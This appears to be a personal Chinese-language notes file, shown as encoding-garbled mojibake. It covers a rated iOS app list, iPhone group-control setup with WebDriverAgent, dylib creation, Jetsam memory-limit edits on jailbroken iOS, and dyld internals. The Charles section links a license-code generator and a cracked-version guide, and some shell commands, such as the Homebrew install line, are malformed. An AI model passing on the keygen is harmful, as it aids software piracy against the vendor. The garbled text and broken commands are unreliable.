â˜…â˜…â˜…â˜…  | [iTranslate Voice] | ç¿»è¯‘åˆ©å™¨ | $4.99 | [#](http://www.idownloadblog.com/2013/07/03/itranslate-voice-2/)
â˜…â˜…â˜…â˜…  | [Launch Center Pro] | å¿«é€Ÿå¯åŠ¨&ä¹¦ç­¾ | $4.99 | [#](http://www.macstories.net/reviews/launch-center-pro-2-0-review/)
â˜…â˜…â˜…â˜…  | [Clear+] | è½»é‡çº§ To-Do List | $4.99 | [#](http://www.macworld.com/article/2048920/clear-for-ios-7-review-slick-to-do-list-app-gets-bigger-slicker.html)
â˜…â˜…â˜…â˜…  | [Drafts 4] | æ–‡å­—ç”Ÿäº§åŠ› | $9.99 | [#](http://www.macstories.net/ios/drafts-4-1-and-merging-notes/)
â˜…â˜…â˜…â˜…  | [MoneyWiz 2] | è®°è´¦è½¯ä»¶ | $4.99 | [#](http://sspai.com/28132)
â˜…â˜…â˜…â˜†  | [Todo] | é‡é‡çº§ To-Do GTD | $4.99 | [#](http://www.imore.com/todo-7-ios-review-brand-new-look-and-great-new-experience)
â˜…â˜…â˜…â˜†  | [Reeder] | RSSé˜…è¯»å™¨ | $4.99 | [#](http://www.macstories.net/reviews/reeder-2-review-2/)
â˜…â˜…â˜…â˜†  | [Omnifocus] | è¿˜æ˜¯é‚£ä¸ªGTD | $19.99 | [#](http://www.imore.com/omnifocus-2-iphone-review-completely-redesigned-ios-7-easier-use-ever)
â˜…â˜…â˜…â˜†  | [Fantastical] | æ—¥å†å’Œæé†’å·¥å…· | $3.99 | [#](http://www.macworld.com/article/2058681/fantastical-2-for-iphone-review-calendar-app-gets-more-fantastic-for-ios-7.html)
â˜…â˜…â˜…â˜†  | [GoodReader] | æ–‡æ¡£ç®¡ç†ã€é˜…è¯»å·¥å…· | $4.99 | [#](http://www.macworld.com/product/460078/goodreader-for-ipad.html)
â˜…â˜…â˜…   | [Sleep Cycle] | æ™ºèƒ½é—¹é’Ÿ | $1.99 | [#](http://mymorningroutine.com/sleep-cycle-review/)
â˜…â˜…â˜…   | [Afterlight] | ç…§ç‰‡å¤„ç†è½¯ä»¶ | $0.99 | [#](http://ipad.appstorm.net/reviews/photography-reviews/afterlight-simple-subtle-photo-editing-brilliance/)
â˜…â˜…â˜…   | [Moves] | å¥åº·è®¡æ­¥ç±»| $2.99 | [#](http://www.trustedreviews.com/moves_Mobile-App_review)
â˜…â˜…â˜…   | [TextExpander] | å¿«é€Ÿè¾“å…¥/æ‰©å±•å¢å¼ºå·¥å…· | $4.99 | [#](http://www.macstories.net/reviews/textexpander-touch-2-0-brings-fill-in-snippets-formatted-text-to-ios/)
â˜…â˜…â˜…   | [Pastebot] | äº‘å‰ªåˆ‡æ¿ | $3.99 | [#](http://www.macstories.net/reviews/pastebot-iphone-review/)
â˜…â˜…â˜…   | [Byword] | Markdownå†™ä½œ | $4.99 | [#](http://iphone.appstorm.net/reviews/productivity/byword-2-1-beautiful-markdown-for-ios-7/)
â˜…â˜…â˜…   | [Day One] | æ—¥è®°è½¯ä»¶ | $4.99 | [#](http://www.macstories.net/tag/day-one/)
â˜…â˜…â˜…   | [Solar Walk] | å¤ªé˜³ç³»æ¨¡å‹ | $2.99 | [#](http://reviews.cnet.com/8301-19512_7-57539611-233/coolest-app-ive-seen-all-month-solar-walk/)
â˜…â˜…â˜…   | [OmniGraffle] | åˆ¶å›¾åˆ¶è¡¨ | $49.99 | [#](http://mac.appstorm.net/reviews/graphics/omnigraffle-6-a-huge-leap-for-the-mac-diagraming-app-2/)
â˜…â˜…â˜…   | [éšæ‰‹è®°ä¸“ä¸šç‰ˆ] | è®°è´¦è½¯ä»¶ | ï¿¥6 | [#](http://digi.tech.qq.com/a/20111107/000548_1.htm)
â˜…â˜…â˜…   | [DailyCost] | è®°è´¦è½¯ä»¶ | $1.99 | [#](http://iphone.appstorm.net/reviews/business-finance/dailycost-tracking-your-spending-just-got-beautiful/)
â˜…â˜…â˜…   | [Splashtop] | ç”¨iOSè¿œç¨‹æ§åˆ¶è®¡ç®—æœº | $9.99 | [#](http://www.macworld.com/article/2030876/review-splashtop-2-a-free-innovative-remote-desktop-mac-ios-app-with-issues.html)
â˜…â˜…â˜…   | [Things] | è¿˜æ˜¯GTD | $9.99 | [#](http://www.idownloadblog.com/2013/10/15/todo-7-review/)
â˜…â˜…â˜…   | [Runtastic Pro] | è·‘æ­¥å¥åº·ç±» | $4.99 | [#](http://theruniverse.com/2012/07/review-runtastic-pro-gps-iphone-app/)
â˜…â˜…â˜…   | [Wolfram] | è®¡ç®—å’ŒçŸ¥è¯†åº“ | $2.99 | [#](http://lifehacker.com/tag/wolfram-alpha)
â˜…â˜…â˜…   | [Solar] | ç²¾ç¾å¤©æ°”åº”ç”¨ | $0.99 | [#](http://www.imore.com/solar-weather-iphone-review)
â˜…â˜…â˜…   | [Writer Pro] | ä¸ªäººå†™ä½œè½¯ä»¶ | $19.99 | [#](http://www.imore.com/writer-pro-now-available-app-store-both-mac-and-ios)
â˜…â˜…â˜…   | [Editorial] | MarkDownä¹¦å†™è½¯ä»¶ | $6.99 | [#](http://www.macstories.net/stories/editorial-for-ipad-review/)
â˜…â˜…â˜…   | [Notability] | æ—¥è®°è½¯ä»¶ | $2.99 | [#](http://www.laptopmag.com/reviews/note-taking-apps/notability.aspx)
â˜…â˜…â˜…   | [Gneo] | GTD:To-doç±» | $9.99 | [#](http://appadvice.com/review/quickadvice-gneo)
â˜…â˜…â˜…   | [Mextures] | ç…§ç‰‡æ•ˆæœå¤„ç†è½¯ä»¶ | $1.99 | [#](http://reviews.cnet.com/software/mextures-ios/4505-3513_7-35782639.html)
â˜…â˜…â˜…   | [Vesper] | æ”¶é›†æƒ³æ³•ç¬”è®° | $4.99 | [#](http://www.macstories.net/reviews/vesper-review-collect-your-thoughts/)
â˜…â˜…â˜…   | [TeeVee] | è¿½ç¾å‰§ã€TV Showç­‰ | $1.99 | [#](http://www.imore.com/teevee-2-iphone-can-track-your-favorite-shows-and-alert-you-when-new-episode-airing)
â˜…â˜…â˜…   | [Air Display] | ç”¨iOSè®¾å¤‡åšä¸ºæ‰©å±•å± | $9.99 | [#](http://www.148apps.com/reviews/air-display-2-review/)
â˜…â˜…â˜…   | [Instaframe Pro] | å¤šå›¾åˆä¸€ï¼Œæ‹¼åˆå·¥å…· | $1.99 | [#](http://www.148apps.com/reviews/instaframe-pro-review/)
â˜…â˜…â˜…   | [OmmWriter] | é™å¿ƒå†™ä½œ | $4.99 | [#](http://www.148apps.com/reviews/ommwriter-ipad-review/)
â˜…â˜…â˜…   | [Prompt] | SSHè¿œç¨‹Hostç®¡ç†å®¢æˆ·ç«¯ | $7.99 | [#](http://www.148apps.com/reviews/prompt-review/)
â˜…â˜…â˜…   | [iA Writer] | å†™ä½œå·¥å…· | $4.99 | [#](http://www.geekswithjuniors.com/blog/2012/10/17/ia-writer.html)
â˜…â˜…â˜…   | [StockWatch] | è‚¡ç¥¨è¡Œæƒ…æŸ¥çœ‹ | $5.99 | [#](http://www.imore.com/bloomberg-ipad-review-casual-stock-app-ipad)
â˜…â˜…â˜…   | [Money Monitor] | é‡‘èç†è´¢è®°è´¦å·¥å…· | $1.99 | [#](http://www.imore.com/top-5-budget-finance-tracking-apps-iphone)
â˜…â˜…â˜…   | [Living Earth Clock] | å…¨çƒæ—¶é—´å·¥å…· | $2.99 | [#](http://www.148apps.com/reviews/living-earth-hd-world-time-clock-weather-review/)
â˜…â˜…â˜…   | [Sync for Firefox] | å¦‚æœä½ æ˜¯ç«ç‹ç”¨æˆ· | $0.99 | [#](https://support.mozilla.org/en-US/questions/964649)
â˜…â˜…â˜…   | [Screens VNC] | è¿œç¨‹æ¡Œé¢å·¥å…·VNC | $19.99 | [#](http://www.imore.com/screens-20-review)
â˜…â˜…â˜…   | [Mobile Mouse] | ç”¨æ‰‹æœºåšä¸ºé¼ æ ‡æˆ–è§¦æ§æ¿ | $1.99 | [#](http://www.knowyourmobile.com/apps/10288/mobile-mouse-ipad-review)
â˜…â˜…â˜…   | [Live Cams Pro] | ä½¿ç”¨æŸ¥çœ‹å…¨çƒæ•°ä»¥åƒè®¡çš„å…¬å…±æ‘„åƒå¤´ | $3.99 | [#](http://forums.imore.com/ios-apps-games/258748-world-live-cams-pro-surveillance-camera-viewer-app.html)
â˜…â˜…â˜…   | [FileBrowser] | æŸ¥çœ‹è¿œç¨‹ç”µè„‘çš„æ–‡ä»¶ | $4.99 | [#](http://www.macworld.com/product/462870/filebrowser-access-files-on-remote-computers.html)
â˜…â˜…â˜…   | [TextGrabber] | OCRå›¾ç‰‡æ–‡å­—è¯†åˆ«(å›¾è½¬å­—)å·¥å…· | $5.99 | [#](http://www.iphonejd.com/iphone_jd/2013/04/review-abbyy-textgrabber-translator.html)
â˜…â˜…â˜…   | [æ¬§è·¯è¯å…¸ Pro] | ç¿»è¯‘è½¯ä»¶ï¼Œæ”¯æŒç¦»çº¿è¯åº“ï¼Œå±å¹•å–è¯ | ï¿¥18 | [#](http://www.eudic.net/eudic/mac_dictionary.aspx)
â˜…â˜…â˜…   | [Mercury Browser Pro] | æµè§ˆå™¨ | $0.99 | [#](http://www.macworld.com/product/377687/mercury-web-browser-pro-the-most-advanced-brow.html)
â˜…â˜…â˜…   | [Air Video] | ç§»åŠ¨ç«¯æ’­æ”¾ç”µè„‘ä¸Šçš„è§†é¢‘æµï¼Œæ— éœ€æ‹·è´ | $2.99 | [#](http://www.tuaw.com/2013/11/05/how-a-pc-and-air-video-hd-turned-my-ipad-into-the-ultimate-enter/)
â˜…â˜…â˜…   | [MacID](https://itunes.apple.com/app/id948478740?mt=8&ls=1) | æ‰‹æœºè§£é” Mac, iOS å’Œ macOS é—´å‰ªè´´æ¿ï¼Œitunes ç®€å•æ§åˆ¶ | $3.99 | [#](https://itunes.apple.com/app/id948478740?mt=8&ls=1)

 # -----------------------------------
 
  ### iOSç¾¤æ§å®ç° - WebDriverAgent
  ## [iPhoneç¾¤æ§æµ‹è¯•å¼€å‘æ•™ç¨‹](https://mp.weixin.qq.com/s?__biz=MjM5MjUxODExMQ==&mid=2652393753&idx=1&sn=1edb1a7db6b4225dbd4b6b4df8af96f7&chksm=bd49eba98a3e62bf45ec72d14dd0640268bef05efb4489edd3c0c4803049e50f369fa98c4711&mpshare=1&scene=22&srcid=11160hQ6GGnxFSQxIxb5Yf2N&sharer_sharetime=1637022101829&sharer_shareid=7a5b79e2ee76a21460e7fe67bd1a6b50#rd)
 ```
WebDriverAgentæ˜¯ç”¨äºiOSçš„WebDriveræœåŠ¡å™¨å®ç°ï¼Œ
å¯ç”¨äºè¿œç¨‹æ§åˆ¶iOSè®¾å¤‡ã€‚å®ƒå…è®¸æ‚¨å¯åŠ¨å’Œç»ˆæ­¢åº”ç”¨ç¨‹åºï¼Œ
ç‚¹å‡»å¹¶æ»šåŠ¨è§†å›¾æˆ–ç¡®è®¤å±å¹•ä¸Šæ˜¯å¦å­˜åœ¨è§†å›¾ã€‚
è¿™ä½¿å…¶æˆä¸ºç”¨äºåº”ç”¨ç¨‹åºç«¯åˆ°ç«¯æµ‹è¯•æˆ–é€šç”¨è®¾å¤‡è‡ªåŠ¨åŒ–çš„ç†æƒ³å·¥å…·ã€‚

å®ƒé€šè¿‡é“¾æ¥XCTest.frameworkå’Œè°ƒç”¨Appleçš„API
æ¥ç›´æ¥åœ¨è®¾å¤‡ä¸Šæ‰§è¡Œå‘½ä»¤æ¥å·¥ä½œã€‚
WebDriverAgentæ˜¯Facebookå¼€å‘å’Œç”¨äºç«¯åˆ°ç«¯æµ‹è¯•çš„


å®‰è£… homebrew
homebrew æ˜¯ Mac OS ä¸‹æœ€ä¼˜ç§€çš„åŒ…ç®¡ç†å·¥å…·ï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚
xcode-select --install ruby -e "$(curl -fsSLhttps://raw.githubusercontent.com/Homebrew/install/master/install)"

å®‰è£… python
è„šæœ¬è¯­è¨€ python ç”¨æ¥ç¼–å†™æ¨¡æ‹Ÿçš„ç”¨æˆ·æ“ä½œã€‚
brew install python3

å®‰è£… libimobiledevice
libimobiledevice æ˜¯ä¸€ä¸ªä½¿ç”¨åŸç”Ÿåè®®ä¸è‹¹æœiOSè®¾å¤‡è¿›è¡Œé€šä¿¡çš„åº“ã€‚
é€šè¿‡è¿™ä¸ªåº“æˆ‘ä»¬çš„ Mac OS èƒ½å¤Ÿè½»æ¾è·å¾— iOS è®¾å¤‡çš„ä¿¡æ¯ã€‚
brew install --HEAD libimobiledevice


æŸ¥çœ‹ iOS è®¾å¤‡æ—¥å¿—


idevicesyslog
æŸ¥çœ‹é“¾æ¥è®¾å¤‡çš„UDID


idevice_id --list
æŸ¥çœ‹è®¾å¤‡ä¿¡æ¯


ideviceinfo
è·å–è®¾å¤‡æ—¶é—´


idevicedate
è·å–è®¾å¤‡åç§°


idevicename
ç«¯å£è½¬å‘


iproxy XXXX YYYY
å±å¹•æˆªå›¾
idevicescreenshot

å®‰è£… Carthage

Carthage æ˜¯ä¸€æ¬¾iOSé¡¹ç›®ä¾èµ–ç®¡ç†å·¥å…·ï¼Œä¸ Cocoapods æœ‰ç€ç›¸ä¼¼çš„åŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©ä½ æ–¹ä¾¿çš„ç®¡ç†ä¸‰æ–¹ä¾èµ–ã€‚å®ƒä¼šæŠŠä¸‰æ–¹ä¾èµ–ç¼–è¯‘æˆ frameworkï¼Œä»¥ framework çš„å½¢å¼å°†ä¸‰æ–¹ä¾èµ–åŠ å…¥åˆ°é¡¹ç›®ä¸­è¿›è¡Œä½¿ç”¨å’Œç®¡ç†ã€‚

WebDriverAgent æœ¬èº«ä½¿ç”¨äº† Carthage ç®¡ç†é¡¹ç›®ä¾èµ–ï¼Œå› æ­¤éœ€è¦æå‰å®‰è£… Carthageã€‚

brew install carthage

å®‰è£… WebDriverAgent

WebDriverAgent æ˜¯ Facebook æ¨å‡ºçš„ä¸€æ¬¾ iOS ç§»åŠ¨æµ‹è¯•æ¡†æ¶ï¼Œèƒ½å¤Ÿæ”¯æŒæ¨¡æ‹Ÿå™¨ä»¥åŠçœŸæœºã€‚

WebDriverAgent åœ¨ iOS ç«¯å®ç°äº†ä¸€ä¸ª WebDriver server ï¼Œå€ŸåŠ©è¿™ä¸ª server æˆ‘ä»¬å¯ä»¥è¿œç¨‹æ§åˆ¶ iOS è®¾å¤‡ã€‚ä½ å¯ä»¥å¯åŠ¨ã€æ€æ­»åº”ç”¨ï¼Œç‚¹å‡»ã€æ»šåŠ¨è§†å›¾ï¼Œæˆ–è€…ç¡®å®šé¡µé¢å±•ç¤ºæ˜¯å¦æ­£ç¡®ã€‚

ä» github å…‹éš† WebDriverAgent çš„æºç ã€‚

git clone https://github.com/facebook/WebDriverAgent.git

è¿è¡Œåˆå§‹åŒ–è„šæœ¬ï¼Œç¡®ä¿ä¹‹å‰å·²ç»å®‰è£…è¿‡ Carthageã€‚

iPhoneç¾¤æ§æµ‹è¯•å¼€å‘æ•™ç¨‹
https://mp.weixin.qq.com/s?__biz=MjM5MjUxODExMQ==&mid=2652393753&idx=1&sn=1edb1a7db6b4225dbd4b6b4df8af96f7&chksm=bd49eba98a3e62bf45ec72d14dd0640268bef05efb4489edd3c0c4803049e50f369fa98c4711&mpshare=1&scene=22&srcid=11160hQ6GGnxFSQxIxb5Yf2N&sharer_sharetime=1637022101829&sharer_shareid=7a5b79e2ee76a21460e7fe67bd1a6b50#rd

 ```
 
 ### è‡ªå®šä¹‰åˆ›å»º.dylibæ–‡ä»¶
 ```
 1.åˆ›å»ºæ–°å·¥ç¨‹Â ,Â é€‰æ‹©OSÂ XÂ ->Framework&Library->Â Library
 
 2.TARGETSÂ ->BuildÂ SettingsÂ ->Â InstallationÂ DirectoryÂ ä¿®æ”¹æˆ@executable_path/
 
 3.TARGETSÂ ->Â BuildÂ SettingsÂ ->Â BaseÂ SDKÂ æ”¹æˆLatestÂ iOSæˆ–è€…iOSÂ X.X
 
 4.PROJECT->Info->iOSÂ DeploymentÂ TargetÂ é€‰æ‹©ç‰ˆæœ¬æ”¯æŒ
 
 5.Project->BuildÂ SettingsÂ ->BaseÂ SDKÂ æ”¹æˆLatestÂ iOSæˆ–è€…iOSÂ X.X6.é€‰æ‹©è¯ä¹¦
 
 7.é€‰æ‹©è®¾å¤‡,Â è¿è¡Œ
 ```
 
 ## è¶Šç‹±iOSç³»ç»Ÿå†…å­˜é™åˆ¶ä¿®æ”¹

åœ¨ iOS ä¸­é‡è¦çš„ç›‘æ§ç½‘ç»œè¿›ç¨‹å†…å­˜ä½¿ç”¨é‡å’Œåœæ­¢æº¢å‡ºé™åˆ¶çš„è¾¹ç¼˜é…ç½®åœ¨å®ƒçš„é…ç½® Jetsam ä¸­æœ‰ç›¸å…³çš„å†…å­˜åšé™åˆ¶çš„ï¼Œ
å®ƒçš„ä¸€èˆ¬æ–‡ä»¶åœ¨/System/Library/LaunchDaemons/com.apple.jetsamproperties.{Model}.plistï¼Œ
æ¨¡å‹åœ¨å„ä¸ªæ‰‹æœºä¸Šå¯èƒ½é‡Œé¢å¯¹ VPN è¿›ç¨‹åšé™åˆ¶çš„æ¡ç›®æ˜¯ï¼š

				<key>com.apple.networkextension.packet-tunnel</key>
				<dict>
					<key>ActiveHardMemoryLimit</key>
					<integer>15</integer>
					<key>InactiveHardMemoryLimit</key>
					<integer>15</integer>
					<key>JetsamPriority</key>
					<integer>14</integer>
				</dict>
æ‰“å¼€æ–‡ä»¶åæœç´¢packet-tunnelæ‰¾åˆ°ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ª15å°±æ˜¯ iOS å¯¹ VPN è¿›ç¨‹çš„å†…å­˜é™åˆ¶å€¼ 15MBã€‚

è¦ä¿®æ”¹iOS VPNè¿›ç¨‹çš„å†…å­˜é™åˆ¶ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å¤åˆ¶iFileç­‰æ–‡ä»¶ç®¡ç†å·¥å…·æ‰¾åˆ°è¿™äº›é…ç½®æ–‡ä»¶ï¼Œåˆ°ç”µè„‘ä¸Šç„¶åå¯¹ç›¸å…³æ•°å€¼è¿›è¡Œä¿®æ”¹ï¼Œä¿®æ”¹åè¦†ç›–åŸå§‹æ–‡ä»¶ï¼Œæ¢å¤ä¸€ä¸‹æ‰‹æœºæ™ºèƒ½ã€‚

æ‰“å¼€è¦è¿™äº›plistæ–‡ä»¶éœ€è¦ä¸€äº›ç‰¹æ®Šçš„ç¼–è¾‘å™¨;å¦‚æœä½ ç”¨çš„æ˜¯macOSï¼Œä¸”å®‰è£…æœ‰Xcodeä¸­ï¼Œé‚£å°±å¯ä»¥ç›´æ¥åŒå‡»æ‰“å¼€ï¼Œ

è¦ä¿®æ”¹çš„å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯è¦æŠŠå†…å®¹æ”¹å¤§å°±è¡Œï¼Œæ¯”å¦‚æŠŠåŸæ¥çš„15MBçš„é™åˆ¶æ”¹ä¸º30MBçš„é™åˆ¶ï¼š

				<key>com.apple.networkextension.packet-tunnel</key>
				<dict>
					<key>ActiveHardMemoryLimit</key>
					<integer>30</integer>
					<key>InactiveHardMemoryLimit</key>
					<integer>30</integer>
					<key>JetsamPriority</key>
					<integer>14</integer>
				</dict>
 
 ## Charles æŠ“åŒ…å·¥å…·
  Charlesæ¿€æ´»ç :  https://www.zzzmode.com/mytools/charles/
  ```
  å®‰è£…ä½¿ç”¨æœ€æ–°ç‰ˆï¼Œå®˜æ–¹ä¸‹è½½åœ°å€ https://www.charlesproxy.com/download
  æ­¤å·¥å…·ç”¨äºè®¡ç®—Charlesæ¿€æ´»ç ï¼Œä¸‹è½½ä»£ç  ï¼Œåœ¨çº¿è¿è¡Œä»£ç ï¼šhttps://play.golang.org/p/Qtt2CmHbTzU
  blogä»‹ç»: https://blog.zzzmode.com/2017/05/16/charles-4.0.2-cracked
  è¾“å…¥RegisterName(æ­¤åç§°éšæ„ï¼Œç”¨äºæ˜¾ç¤º Registered to xxx)ï¼Œç‚¹å‡»ç”Ÿæˆè®¡ç®—å‡ºæ³¨å†Œç ï¼Œæ‰“å¼€Charlesè¾“å…¥æ³¨å†Œç å³å¯ã€‚
 ```
 
## dyld è‹¹æœæ“ä½œç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥å™¨
 ```
dyldå’Œæ“ä½œç³»ç»Ÿçš„å…³ç³»å‡†ç¡®æ¥è¯´ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡æ˜ å°„çš„æ–¹å¼å°†å®ƒåŠ è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ã€‚

æ“ä½œç³»ç»ŸåŠ è½½å®Œdyldåï¼Œå°±æŠŠæ§åˆ¶æƒäº¤ç»™dyldã€‚å½“dyldå¾—åˆ°æ§åˆ¶æƒåï¼Œå…¶è‡ªèº«å¼€å§‹ä¸€ç³»åˆ—çš„åˆå§‹åŒ–æ“ä½œï¼Œç„¶ååæ ¹æ®è®¾ç½®çš„ç¯å¢ƒå˜é‡ï¼Œ
å¯¹å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œé“¾æ¥å·¥ä½œï¼Œè¿™ä¸ªé“¾æ¥æ­¥éª¤ç§°ä¸ºåŠ¨æ€é“¾æ¥(dynamic link)ã€‚
å½“æ‰€æœ‰é“¾æ¥å·¥ä½œå®Œæˆåï¼Œdyldä¼šæŠŠæ§åˆ¶æƒäº¤ç»™å¯æ‰§è¡Œæ–‡ä»¶çš„å…¥å£ï¼Œç¨‹åºå¼€å§‹æ‰§è¡Œã€‚
é‚£å¯æ‰§è¡Œæ–‡ä»¶åˆæ˜¯ä»€ä¹ˆï¼Œæ—¢ç„¶æœ‰åŠ¨æ€é“¾æ¥ï¼Œæ˜¯å¦ä¹Ÿæœ‰é™æ€é“¾æ¥ï¼Ÿæ˜¯çš„ï¼Œé™æ€é“¾æ¥å°±æ˜¯ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªé‡è¦æ­¥éª¤ã€‚

2.2 å¯æ‰§è¡Œæ–‡ä»¶
å¯æ‰§è¡Œæ–‡ä»¶æ˜¯ç¨‹åºçš„æºä»£ç æ–‡ä»¶ç»è¿‡é¢„ç¼–è¯‘ã€ç¼–è¯‘ã€æ±‡ç¼–ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ï¼Œè¿›ä¸€æ­¥é€šè¿‡é“¾æ¥åˆå¹¶æˆå¯ä¾›ç³»ç»Ÿæ‰§è¡Œçš„æ–‡ä»¶ï¼Œ
ä¹Ÿå°±æ˜¯mach.oæ–‡ä»¶ã€‚å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦è¢«è£…è½½è¿›å†…å­˜ï¼Œæ‰èƒ½è¢«ç³»ç»Ÿè¯»å–ã€‚

è¿™æ˜¯mach.oæ–‡ä»¶ç»“æ„çš„å®˜æ–¹å›¾ã€‚å…¶ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š

Header(å¤´éƒ¨ä¿¡æ¯)ï¼Œè¯´æ˜æ•´ä¸ªMach.oæ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯
Load Commands(åŠ è½½å‘½ä»¤)ï¼Œè¯´æ˜ç³»ç»Ÿåº”è¯¥æ€ä¹ˆåŠ è½½æ–‡ä»¶ä¸­çš„æ•°æ®
Data(æ–‡ä»¶æ•°æ®)ï¼ŒåŒ…å«ç¬¦å·è¡¨ï¼Œä»£ç ç­¾åï¼Œç¨‹åºä»£ç ç­‰æ•°æ®ã€‚

å¯æ‰§è¡Œæ–‡ä»¶æŸ¥çœ‹æ­¥éª¤ï¼š
åœ¨é¡¹ç›®Productsæ–‡ä»¶å¤¹ä¸‹çš„.appç»“å°¾çš„æ–‡ä»¶ Show In Finder,ç„¶åæ˜¾ç¤ºåŒ…å†…å®¹
ä½†æ˜¯æƒ³è¦å¯è§†åŒ–å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹è½¯ä»¶MachOViewã€‚
å¯æ‰§è¡Œæ–‡ä»¶ç”Ÿæˆçš„æ­¥éª¤å¦‚æœå±•å¼€æ¥ï¼Œä¸æ˜¯ä¸‰è¨€ä¸¤è¯­èƒ½è®²æ¸…æ¥šçš„ï¼Œè¿™é‡Œåªåšä¸ªç®€å•çš„ä»‹ç»ï¼š
é¢„ç¼–è¯‘:**é¢„ç¼–è¯‘çš„è¿‡ç¨‹å°±æ˜¯å¤„ç†æºä»£ç æ–‡ä»¶ä¸­ä»¥"#"å¼€å¤´çš„é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†å…¶å±•å¼€ã€‚
**
ç¼–è¯‘:ç¼–è¯‘çš„è¿‡ç¨‹å°±æ˜¯æŠŠé¢„ç¼–è¯‘åæ–‡ä»¶è¿›ä¸€æ­¥åšè¯æ³•åˆ†æï¼Œè¯­æ³•åˆ†æï¼Œç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œç»è¿‡è¯­ä¹‰åˆ†æåè½¬æ¢æˆä¸­é—´ä»£ç ï¼Œä¼˜åŒ–åç”Ÿæˆæ±‡ç¼–ä»£ç æ–‡ä»¶ã€‚
æ±‡ç¼–:æ±‡ç¼–çš„è¿‡ç¨‹å°±æ˜¯æŠŠæ±‡ç¼–ä»£ç è½¬å˜æˆæœºå™¨å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤ã€‚
é“¾æ¥:é“¾æ¥çš„è¿‡ç¨‹å°±æ˜¯æŠŠå„ä¸ªæºä»£ç æ¨¡å—ç›¸äº’å¼•ç”¨çš„éƒ¨åˆ†è¿›è¡Œå¤„ç†ï¼Œè®©å®ƒä»¬ä¹‹é—´å¯ä»¥æ­£ç¡®é“¾æ¥ã€‚è¿™é‡Œçš„é“¾æ¥å³ä¸ºé™æ€é“¾æ¥ã€‚
è£…è½½ï¼š** è£…è½½çš„è¿‡ç¨‹å°±æ˜¯æŠŠç¨‹åºæ‰§è¡Œæ‰€éœ€è¦çš„æŒ‡ä»¤å’Œæ•°æ®éƒ½è£…å…¥å†…å­˜ä¸­**

é™æ€é“¾æ¥æ˜¯ç¼–è¯‘æ—¶çš„é“¾æ¥å·¥ä½œï¼ŒåŠ¨æ€é“¾æ¥æ˜¯è¿è¡Œæ—¶çš„é“¾æ¥å·¥ä½œï¼Œè™½ç„¶å®ƒä»¬åšçš„äº‹å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯ä¸å¯æ··ä¸ºä¸€è°ˆã€‚

dyld2:åœ¨iOS13ä¹‹å‰ä½¿ç”¨çš„ç‰ˆæœ¬
dyld3:åœ¨iOS13åŠä¹‹åä½¿ç”¨çš„ç‰ˆæœ¬ï¼ŒiOS11ä¹‹å‰çš„ç³»ç»Ÿåº“ä¼˜åŒ–å·²ç»ä½¿ç”¨

dyld2åœ¨å¯åŠ¨æ—¶åšäº†å¤§é‡çš„è®¡ç®—å’ŒæŸ¥æ‰¾æ“ä½œï¼Œç³»ç»Ÿä¸ºäº†ä¼˜åŒ–å¯åŠ¨æ—¶é—´ï¼Œè®¾è®¡äº†dyld3ï¼Œdyld3çš„æ¥å£å’Œdyld2æ˜¯å…¼å®¹çš„ï¼Œå› æ­¤å¼€å‘è€…æ²¡æœ‰ä»»ä½•æ„ŸçŸ¥ã€‚
dyld3çš„ç‰¹ç‚¹æ˜¯è¿›ç¨‹å¤–çš„ä¸”æœ‰ç¼“å­˜çš„ï¼Œå¯åŠ¨appå‰æŠŠå¾ˆå¤šè€—æ—¶æ“ä½œæå‰å¤„ç†å¥½äº†ã€‚æ®ç»Ÿè®¡ï¼Œåœ¨å†·å¯åŠ¨æ—¶ï¼Œdyld3æ¯”dyld2å¿«20%ã€‚
ä½†æ˜¯ç”±äºdyld3æ˜¯æœªå¼€æºçš„ï¼Œå› æ­¤æœ¬æ–‡æ˜¯åŸºäºdyld2å±•å¼€æµç¨‹åˆ†æçš„ï¼Œè¿™äº›å·¥ä½œæµç¨‹åœ¨dyld3ä¹Ÿæ˜¯å­˜åœ¨çš„ï¼Œå¯èƒ½åªæ˜¯æ—¶æœºä¼šæœ‰æ‰€ä¸åŒã€‚

ASLR(Address space layout randomization):åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼Œè™šæ‹Ÿåœ°å€åœ¨å†…å­˜ä¸­ä¼šå‘ç”Ÿçš„åç§»é‡ã€‚å¢åŠ æ”»å‡»è€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®ï¼Œè¾¾åˆ°é˜»æ­¢æº¢å‡ºæ”»å‡»çš„ç›®çš„ã€‚
PIC(Position Independent Code):ç¨‹åºä¸­å…±äº«æŒ‡ä»¤éƒ¨åˆ†åœ¨è£…è½½æ—¶ä¸éœ€è¦å› ä¸ºè£…è½½åœ°å€çš„æ”¹å˜è€Œæ”¹å˜ï¼Œå®ç°å…±äº«ã€‚
